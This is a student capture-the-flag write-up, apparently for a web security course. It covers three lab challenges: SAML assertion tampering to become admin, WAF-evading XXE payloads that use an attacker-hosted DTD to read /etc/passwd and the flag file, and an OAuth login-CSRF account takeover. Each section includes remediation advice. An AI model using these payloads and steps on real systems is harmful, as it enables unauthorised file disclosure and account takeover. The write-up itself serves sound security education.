# EXTENDED BREAK 2

REDACTED (z0000000) and REDACTED (z0000000)

## saml-super-secret.eu.ns.agency / hush-hush-con.eu.ns.agency 

flag: `flag{hmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm}`

This site uses SAML as it's authentication system. 

Following along the authentication protocol, we can capture the SAML response and observe it's contents. From this, we realise that the server is not signing and verifying the integrity of its contents and therefore would not realise that the contents have not been modified. To test this, we initially changed the `nameid` field to `admin@definitely.not.cba.com.au` to see whether the request would go through, and it went through unchallenged, reflected in the email changed in the profile page confirming that it's not validated.

Importantly, we then noticed that the SAML xml response has an attribute named `userType`. This is likely to represent the type of a user and the permission it has on the application. 

By modifiying the `userType` to `Admin` we modify our user's permission and by completing the login we access our user's profile and get the flag that is located in the `last name` field.

This vulnerability is severe as it allows an attacker to assume the role of any known username uncontested and without a password, essentially risking high credential accounts being accessed.

This vulnerability can be patched by ensuring that all assertions are signed and validated against the signature's hash value. 


## xxe.ext2.ns.agency
flag: `COMP6843{lol_i_forgot_to_add_the_flag_lmao._thx_hpy}`

This site expects an XML file in the following format:
```
<very>
  <complex>
    <structure>
      <field1></field1>
      <field2></field2>
      <field3></field3>
    </structure>
  </complex>
</very>
```
Attempting to apply a standard XXE injection payload results in a `Hacking Shield 2 Triggered.` event. This implies that the site is being secured against XXE by a Web Application Firewall (WAF). Based on a standard payload of `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>` we ascertained that the words `etc`, `passwd` and `file://` are captured by the WAF. Using a http server for indirection containing the following dtd on the server (which breaks up the words caught by the WAF):
```
<!ENTITY % file1 "file:">
<!ENTITY % file2 "///et">
<!ENTITY % file3 "c/passw">
<!ENTITY % file4 "d">
<!ENTITY % file "<!ENTITY contents SYSTEM '%file1;%file2;%file3;%file4;'>">
```
The payload for the application was:
```
<!ENTITY % ext SYSTEM 'http://<myhttpserver/ext2.dtd'>
%ext;
%file;
<very>
  <complex>
    <structure>
      <field1>&contents;</field1>
    </structure>
  </complex>
</very>
```
This produced the contents `/etc/passwd` in the `field1` field indicating that it was vulnerable to XXE.

To exploit this, we merely changed the `ext2.dtd` external definition to return the flag file as follows:
```
<!ENTITY % file1 "file:">
<!ENTITY % file2 "///flag">
<!ENTITY % file "<!ENTITY contents SYSTEM '%file1;%file2;'>">
```
Rerunning the payload against the application produces the flag in the `field1` field.

This vulnerability is severe as it can be demonstrated from above that it is possible to have arbitary read to the text fields on the file system including important system files.

This vulnerability can be patched simply by disabling external entities for XML.


## oauth.ext2.ns.agency / oauthclient.ext2.ns.agency 

flag: `COMP6843{only_took_4_hours_to_fix_last_years_oauth_challenge_____fun______279b6727-07f2-4c09-869a-430ce12ba8cc}`

For the following explanation, we will refer to `https://oauth.ext2.ns.agency/` as the oauth **Provider** and `https://oauthclient.ext2.ns.agency/` as the **Client**.

After testing several different oauth vulnerabilities, we found a CSRF vulnerability on oauth authorization response. 

Upon determining that this was the case, we exploited the application by the following steps:
1. We start by creating an account on the **Provider**.
2. We then go to the **Client** and sign in. This brings us back to the **Provider** with a request from `app1` to access our account. 
3. We click `authorize`. Before the **Provider** is able to redirect us back to the **Client**, we block the request and capture the `code` as well as the `state` that the **Provider** was trying to send back to the **Client**. The url looks similar to this: 
`https://oauthclient.ext2.ns.agency/authorize?code=PCcZgz779yzmtuVKsrC5EVBfd509qODpmoPruJ6XHrBDKJNV&state=KO3AdFlz57RSKEYYq0qlEiHcewj7Sk`
4. We go back to the **Client** and go to the contact page. From there we provide our authorize url with the code and state parameters as such: `authorize?code=PCcZgz779yzmtuVKsrC5EVBfd509qODpmoPruJ6XHrBDKJNV&state=KO3AdFlz57RSKEYYq0qlEiHcewj7Sk`
5. The admin visits our URL. At this point our account on the **Provider** is linked with the admin's account on the **Client**.
7. By signing in on the **Client** using oauth, we get access to the admin's account and as part of the history/logs we get the flag.


This is a severe vulnerability as it allows the adding of an unwanted provider to the user's account, though it is limited by needing the target to visit the URL. If the victim is an administrator (as in the exploit above) then consquently, the attacker can potentially access elevated and restricted functionalities.

To mitigate this vulnerability, the website should use oauth's built-in functionality: the `state` parameter. The state should be randomly generated and linked to the user's session similarly to a CSRF token. The value should be passed when making the request to the **Provider** and then checked again in the returned response. If the state is missing in the response or does not match the user's session, simply ignore the response.
